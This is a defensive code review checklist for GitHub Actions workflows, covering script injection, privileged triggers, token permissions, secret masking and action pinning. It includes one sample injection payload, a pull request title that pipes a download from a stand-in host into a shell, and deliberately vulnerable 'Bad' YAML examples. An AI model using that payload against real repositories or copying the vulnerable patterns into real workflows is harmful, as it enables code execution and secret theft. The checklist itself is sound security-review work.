# GitHub Actions — Code Review Checklist

> Check sibling workflows for existing patterns before flagging a convention (see Consistency Check step). Report an item only with a concrete trigger → effect in the changed workflow. A problem that a workflow linter the repository runs, such as actionlint or zizmor, already reports is not a finding. This file covers the workflow files directly in `.github/workflows/` at the repository root and the metadata of actions (`action.yml` or `action.yaml` with a `runs:` key). What a step can do depends on the trigger (`on:`), the `permissions` of the `GITHUB_TOKEN`, the secrets the job receives and the runner, so read all four before judging a step. A workflow never shows the language or the framework of the application: a step that sets up a toolchain proves nothing about the code.

## Untrusted Input

- **Expressions in scripts**: GitHub replaces `${{ ... }}` before the shell runs, so a value that an outside contributor controls, placed directly in `run:` or in the `script:` of `actions/github-script`, becomes part of the script. Such values include `github.event.pull_request.title` and `.body`, `github.event.issue.title` and `.body`, `github.event.comment.body`, `github.event.review.body`, `github.head_ref`, commit messages and author names, and branch names. A title such as `"; curl evil.example | sh #` then runs commands with the job's token and secrets. Pass the value through `env:` and use the shell variable, quoted. **Not a finding:** values that only the repository's maintainers control, such as `github.sha`, `github.ref` on `push`, `github.repository` and `inputs` of `workflow_dispatch` in a repository where only maintainers can run it.
- **Privileged triggers running pull request code**: `pull_request_target` and `workflow_run` run in the context of the base repository. The risk applies only where untrusted code actually runs there with the job's effective permissions, secrets and checkout. A job on these triggers that checks out the pull request head (`ref: ${{ github.event.pull_request.head.sha }}`, or the head branch) and then runs anything from it, such as an install script, a build, tests or a local action, runs the contributor's code with those privileges, unless the checkout refuses first. `actions/checkout` refuses by default to check out fork pull request code under `pull_request_target`, and under `workflow_run` only when `workflow_run.event` is a `pull_request*` event, unless the step sets `allow-unsafe-pr-checkout: true`; the job then fails before any code runs, and a refused checkout is a workflow failure, not executed untrusted code. The guard was introduced in `actions/checkout` v7.0.0 (2026-06-18) and backported on 2026-07-20 to v6.1.0, v5.1.0, v4.4.0, v3.7.0 and v2.8.0; v1 gets no backport. A floating major tag such as `@v4` or `@v6` picks up the backport, but the major label does not show the release it resolves to, so read the exact ref and the release it names. An exact tag, minor or SHA earlier than those releases has no guard, and a floating tag can move, so this describes the releases at review time, not a permanent guarantee. The guard covers only `actions/checkout`: a `run` step that fetches the fork head with `git` or `gh` is not covered by it. The event alone does not prove that every secret reaches the job or that a write scope is granted, so check the job's `permissions` and the secrets it reads. Keep untrusted code in a `pull_request` workflow and pass only data (artifacts) to the privileged one, treating that data as untrusted too.
- **Comment-triggered commands**: an `issue_comment` job that runs a privileged action for whoever writes a command in a comment acts for any GitHub user. Check `github.event.comment.author_association`, or the commenter's permission, before acting.
- **Writing to `$GITHUB_ENV` or `$GITHUB_OUTPUT`**: a step that writes an untrusted value into `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH` can add other lines through a newline in the value, and set variables such as `NODE_OPTIONS`, `BASH_ENV` or `LD_PRELOAD` for later steps. Use the multiline delimiter syntax with a random delimiter, or validate the value.

**Bad** — the pull request title becomes part of the shell script:

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Checking ${{ github.event.pull_request.title }}"
```

**Good** — the title reaches the script only as a quoted environment variable:

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Checking $TITLE"
```

## Permissions and Secrets

- **Token permissions wider than the job needs**: without a `permissions:` key, the `GITHUB_TOKEN` gets the default set at the enterprise, organization or repository level, and the workflow file does not show that default. Repositories inherit from their organization, and organizations can inherit from their enterprise. The February 2023 change made the new defaults read-only and did not change existing enterprises, organizations or repositories, so a repository's creation date shows neither its token scope nor whether it is safe. Do not infer the scope from the creation date, and do not ask for settings changes. Report `permissions: write-all`, or write scopes such as `contents: write`, `pull-requests: write`, `id-token: write` or `actions: write`, declared on a job that also runs code from a pull request, a third-party action or a dependency install it does not need them for. **Not a finding:** a job whose only steps need that scope, such as a release job that pushes a tag.
- **Secrets given to code that does not need them**: a secret set in workflow-level `env:` reaches every step of the job, including third-party actions and scripts. `secrets: inherit` on a reusable-workflow call (`jobs.<job_id>.secrets.inherit`) works differently: it makes all of the caller's secrets available to the called workflow's `secrets` context, but availability does not put every secret into every step. A step receives a value only where the called workflow reads it: by interpolating `${{ secrets.NAME }}` directly in `run:`, by mapping it into a step's `env:` or `with:`, or by passing it on to a nested reusable workflow with `jobs.<job_id>.secrets`. Report `secrets: inherit` only when an accepted call lets the called workflow, or a workflow the caller can be changed to call by someone outside the caller's trust boundary, read an unneeded secret in a step that runs third-party code or otherwise gives code outside the caller's intended trust a capability to use it, or when the called workflow is owned outside the repository's trust boundary. Judge by what the called workflow reads and where it sends the value, not by the secret's name. A trusted same-repository callee that uses one named secret in one step does not expose every inherited secret, and an invalid or rejected reusable-workflow invocation delivers no secret, so do not describe it as executed secret delivery. Passing each named secret only to the step that uses it is a contextual mitigation, not a blanket rule.
- **Transformed secrets in logs**: redaction is performed by the runner, for the exact values it knows in that job: the secrets the job received and the values registered with `::add-mask::`. The runner also registers value encoders for each value it masks (base64 with its offset variants, JSON, URI, XML and command-line escaping, among others; `HostContext.cs`), so an encoded form of a secret the job received is normally masked without `::add-mask::`. GitHub still gives no blanket guarantee for derived values, and it recommends registering them. Report a step that emits a derived value only when it is an actual unmasked representation: it is not one of those registered encodings, the job did not register it with `::add-mask::` before the output, and the output exposes the original credential or a useful part of it. Examples that expose it are a reversible encoding outside the runner's list (for example hex) of a secret the job received, and a newly derived secret, such as a signed token or a generated password, that the job prints without registering it. Ciphertext or a one-way digest does not itself expose the original credential, and a partial value needs a concrete sensitive effect. Runner redaction does not cover a value the job neither received nor registered, so the masking protection never exempts it. This review cannot verify the logs; state that limit, and do not print any real secret while reporting.
- **Persisted checkout credentials**: `actions/checkout` persists the token by default (`persist-credentials: true`), and where it is stored depends on the version. The v4 README describes the token in the local git config, removed during post-job cleanup. The v6 and v7 READMEs describe a separate credential file under `$RUNNER_TEMP` instead of directly in `.git/config`, so a `.git` config that refers to that file does not hold the value. Report a later artifact or cache step in the same job only when its paths include the file that actually holds the credential for that checkout version. Check the version and the upload paths rather than assuming the `.git` directory holds the token. Set `persist-credentials: false` when no later step pushes, or upload only paths that do not include the credential; these are contextual mitigations, not a blanket requirement.

## Supply Chain and Runners

- **Actions referenced by a moving tag or branch**: `uses: owner/action@v2` or `@main` runs whatever that tag or branch points to at run time, and a compromised action repository can move it, as happened to `tj-actions/changed-files` in March 2025 (CVE-2025-30066). Report a third-party action that the change adds or moves to a tag or branch in a job that has secrets or a token that can write. Pin it to a full commit SHA. **Not a finding:** actions in the same repository (`uses: ./.github/actions/...`) or organization, and a repository or organization policy that already requires full-length SHA pinning.
- **Self-hosted runners for public pull requests**: a public repository whose `pull_request` workflows run on a self-hosted runner lets any contributor run code on that machine, which can keep files and processes between jobs and reach the internal network. Use GitHub-hosted or ephemeral, isolated runners for those workflows.
- **Concurrent deployments**: a deploy job without a `concurrency` group can run twice at the same time, so an older run can finish last and deploy older code. `cancel-in-progress: true` on a deploy job can cancel a deployment halfway. Use a `concurrency` group per environment, without cancelling deploys in progress.

**Bad** — a tag of a third-party action receives the deploy key:

```yaml
steps:
  - uses: example-org/deploy-action@v3
    with:
      key: ${{ secrets.DEPLOY_KEY }}
```

**Good** — the action is pinned to a full commit SHA, with its tag noted for updates:

```yaml
steps:
  - uses: example-org/deploy-action@5f2c3a1e9b7d4c6a8e0f1b2d3c4e5f6a7b8c9d0e # v3.2.1
    with:
      key: ${{ secrets.DEPLOY_KEY }}
```

## Conventions, not defects

- Job and step names, the split into reusable workflows or composite actions, matrix layout and caching choices follow the repository's conventions.
- Pinning first-party `actions/*` actions by SHA, adding `timeout-minutes` and adding `harden-runner` are hardening choices, findings only with a concrete effect in the changed workflow.

## Sources

- Secure use of GitHub Actions and script injections: https://docs.github.com/en/actions/reference/security/secure-use, https://docs.github.com/en/actions/concepts/security/script-injections; the runner's registered value encoders: https://raw.githubusercontent.com/actions/runner/main/src/Runner.Common/HostContext.cs
- `pull_request_target` and `workflow_run`: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows, https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target; fork pull request checkout guard by release: https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/ (v7.0.0 on 2026-06-18, backports on 2026-07-20), https://github.com/actions/checkout/releases; the `allow-unsafe-pr-checkout` input: https://raw.githubusercontent.com/actions/checkout/v7/README.md; GitHub Security Lab on privileged triggers and untrusted input: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/, https://securitylab.github.com/resources/github-actions-untrusted-input/
- `GITHUB_TOKEN` permissions: https://docs.github.com/en/actions/concepts/security/github_token, https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions, https://docs.github.com/en/actions/tutorials/authenticate-with-github_token; the February 2023 default change, which left existing entities unchanged: https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/
- Secrets and masking: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets; reusable-workflow `secrets` keywords, including `jobs.<job_id>.secrets.inherit`: https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations; inherited secrets, the called workflow's `secrets` context and the `run:` example: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idsecretsinherit, https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#onworkflow_callsecrets; secrets passed to nested workflows: https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows; workflow commands, `GITHUB_ENV` and multiline values: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands
- `actions/checkout` and `persist-credentials`, by version: https://raw.githubusercontent.com/actions/checkout/v4/README.md, https://raw.githubusercontent.com/actions/checkout/v6/README.md, https://raw.githubusercontent.com/actions/checkout/v7/README.md
- `tj-actions/changed-files` advisory: https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
- Self-hosted runner security: https://docs.github.com/en/actions/concepts/runners/self-hosted-runners; concurrency: https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency

## Precedents

- **Fork pull requests get no secrets**: a `pull_request` workflow triggered from a fork receives no repository secrets, except the `GITHUB_TOKEN`, and that token is read-only. Do not report secret theft or repository writes by fork code in a `pull_request` workflow. **Exception:** `pull_request_target` and `workflow_run`, which run with the base repository's secrets and token, `issue_comment` jobs that check out the pull request head, the private-repository settings that send secrets or write tokens to fork pull requests, pull requests from branches of the same repository, and self-hosted runners that keep state between jobs.
- **Registered secrets are masked in logs**: the runner replaces the exact value of a secret it knows in the job, meaning a secret the job received or a value registered with `::add-mask::`, with `***` in job logs, and it also masks the encoded forms that its registered value encoders produce for those values (base64 with its offset variants, JSON, URI, XML and command-line escaping; `HostContext.cs`). Do not report such an exact value, or one of those registered encodings, printed unchanged by a step as visible in the logs. **Exception:** a derived value outside those registered encodings, such as a hex or other reversible encoding, unless registered with `::add-mask::` before output; a newly derived secret, such as a signed token, that the job prints without registering it; split or partial values; structured secrets whose parts are printed separately; values the job neither received nor registered; and secrets written to artifacts, caches, job outputs or files, which masking does not cover. GitHub does not guarantee redaction of transformed values, so do not assume it for them.
- **Environment variables keep untrusted text out of the script**: a value assigned to `env:` with `${{ }}` and read in `run:` as a quoted shell variable (`"$TITLE"`) is data, never part of the script's source. Do not report script injection for untrusted values passed that way. **Exception:** the variable passed to `eval`, `sh -c` or another interpreter, used unquoted where word splitting or globbing changes the command, or written to `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH`, and `${{ }}` expressions placed directly in `run:` or in a `github-script` `script:`.
